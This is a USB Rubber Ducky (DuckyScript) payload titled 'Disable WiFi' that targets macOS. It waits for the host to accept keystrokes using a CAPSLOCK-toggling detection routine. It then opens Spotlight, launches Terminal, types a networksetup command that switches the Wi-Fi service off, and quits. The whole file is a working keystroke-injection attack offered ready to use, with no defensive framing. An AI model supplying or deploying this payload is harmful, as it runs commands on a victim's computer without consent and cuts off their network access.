REM_BLOCK
##################################
#                                #
# Title        : Disable WiFi    #
# Author       : bst04 - Aleff   #
# Version      : 1.0             #
# Category     : Execution       #
# Target       : MacOS           #
#                                #
##################################
END_REM

REM Change the #MODE value to "on" if you want to run the WiFi, else leave it as "off"
DEFINE #MODE off

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

REM Another pinch of delay in accordance with https://shop.hak5.org/blogs/usb-rubber-ducky/detect-ready
DELAY 200

GUI SPACE
DELAY 250
STRINGLN TERMINAL
DELAY 250
STRINGLN networksetup -setnetworkserviceenabled Wi-Fi #MODE
DELAY 250
GUI q
